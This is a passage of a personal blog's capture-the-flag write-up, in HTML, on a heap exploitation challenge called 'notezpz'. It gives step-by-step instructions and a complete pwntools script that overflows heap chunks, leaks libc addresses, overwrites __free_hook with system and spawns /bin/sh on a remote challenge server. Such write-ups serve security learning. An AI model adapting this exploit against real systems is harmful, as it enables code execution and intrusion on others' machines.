+</ol>
+<p>So what do you do?</p>
+<ol>
+<li>There’s a pointer to the <code>print_question</code> function, so you can find the address of the got by leaking it (as it is at a constant offset)</li>
+<li>While you cannot write to the got, you can write to hooks in libc!</li>
+<li><em>Let’s face it, buffer overflows are better than other exploits anyway</em></li>
+</ol>
+<p>Here’s a how to:</p>
+<ol>
+<li>Create enough space on the heap by malloc-ing a couple of times, because overflows destroy the chunks.</li>
+<li>Create 2 chunks, then free the one that you malloc-ed later.</li>
+<li>Overflow the string from the first one, into the metadata of the second one. To leak an address from the metadata, you need to get rid of the null byte put at the end of the read, which can be done by overflowing only one byte into the pointer to the next free chunk, then malloc-ing that same chunk to overwrite the pointer (along with the null byte) with the pointer to the <code>print_question</code> function.</li>
+<li>Leak the function pointer, and calculate offset to the GOT.</li>
+<li>Leak an address in libc, by grooming a chunk with the function pointer in the metadata set to the <code>print_question</code> function, and the string pointer set to the address of the GOT.</li>
+<li>If the libc is unknown, do step 5 multiple times to find out the exact version. Here we assume 2.27, same as the one found in ezpz2.</li>
+<li>Calculate offsets to the <code>__free_hook</code> and <code>system</code> functions in libc. We overwrite the free hook as free is called with our buffer, which allows us to control the parameters passed to <code>system</code>.</li>
+<li>(Optional) fix the heap by using the overflow. Amazing for debugging, since you broke <code>vis_heap_chunks</code> from gdb in step 3.</li>
+<li>Overwrite the free hook with system, and call <code>free</code> (but actually <code>system</code> now) with <code>/bin/sh\x00</code> in the buffer.</li>
+<li><code>cat flag</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./notezpz&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;plsdonthaq.me&#x27;</span>, <span class="number">7003</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setQuestion</span>(<span class="params">index, question</span>):</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    p.readuntil(<span class="string">&#x27;question&#x27;</span>)</span><br><span class="line">    p.sendline(question)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ask a question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">askQuestion</span>(<span class="params">index</span>):</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    p.readuntil(<span class="string">&quot;perhaps: &#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extra space to be used later</span></span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line"></span><br><span class="line"><span class="comment"># create 2, overwrite the second one</span></span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line">delete(<span class="number">3</span>)   <span class="comment"># offset by 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overflow into the freed chunk</span></span><br><span class="line">setQuestion(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">31</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc the freed chunk again.</span></span><br><span class="line"><span class="comment"># This deletes the null byte at the end, creating a leak</span></span><br><span class="line">create()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak the address of the print function</span></span><br><span class="line">askQuestion(<span class="number">2</span>)</span><br><span class="line">inp = p.readuntil(<span class="string">&quot;&#x27;&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">print_func = u32(inp[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># The got is at a constant offset from the print function</span></span><br><span class="line">printf_got = print_func + <span class="number">0x27ba</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write the got address into the function</span></span><br><span class="line"><span class="comment"># while keeping the print function&#x27;s address constant</span></span><br><span class="line"><span class="comment"># Since node 3 is destroyed, we overflow into node 2</span></span><br><span class="line">setQuestion(<span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">28</span> + p32(<span class="number">0x21</span>) + p32(print_func) + <span class="number">5</span> * p32(<span class="number">0</span>) + p32(printf_got))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc from the got</span></span><br><span class="line">askQuestion(<span class="number">2</span>)</span><br><span class="line">printf_libc = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate offsets</span></span><br><span class="line">system_libc = printf_libc - <span class="number">0x140d0</span></span><br><span class="line">free_hook = printf_libc + <span class="number">0x188600</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Taking full advantage of the overflow, leak the address of the free hook</span></span><br><span class="line"><span class="comment"># While I&#x27;m at it, I&#x27;ll also fix the heap so I can use vis_heap_chunks again</span></span><br><span class="line">setQuestion(<span class="number">1</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">28</span> + p32(<span class="number">0x21</span>) + p32(print_func)</span><br><span class="line">            + <span class="number">5</span> * p32(<span class="number">0</span>) + p32(free_hook)</span><br><span class="line">            + p32(<span class="number">0x21</span>) + <span class="number">7</span>*p32(<span class="number">0</span>) + p32(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the address of system to the free_hook&#x27;s address</span></span><br><span class="line">setQuestion(<span class="number">2</span>, p32(system_libc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set buffer of unused node to /bin/sh</span></span><br><span class="line">setQuestion(<span class="number">0</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Free the node, but actually call system with its buffer /bin/sh</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><hr>
+<p>All in all, this week was very challenging. Idk what the title is about but I don’t remember any binary to be <em>‘ezpz’</em></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#usemedontabuseme"><span class="toc-number">1.</span> <span class="toc-text">usemedontabuseme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpz1"><span class="toc-number">2.</span> <span class="toc-text">ezpz1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpz2"><span class="toc-number">3.</span> <span class="toc-text">ezpz2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#notezpz"><span class="toc-number">4.</span> <span class="toc-text">notezpz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">5.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/heaping-on/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/heaping-on/&text=Don&#39;t Heap All of This Work On Me"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/heaping-on/&is_video=false&description=Don&#39;t Heap All of This Work On Me"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Don&#39;t Heap All of This Work On Me&body=Check out this article: http://atharvdamle.com/heaping-on/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/heaping-on/&name=Don&#39;t Heap All of This Work On Me&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/heaping-on/&t=Don&#39;t Heap All of This Work On Me"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Atharv Damle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
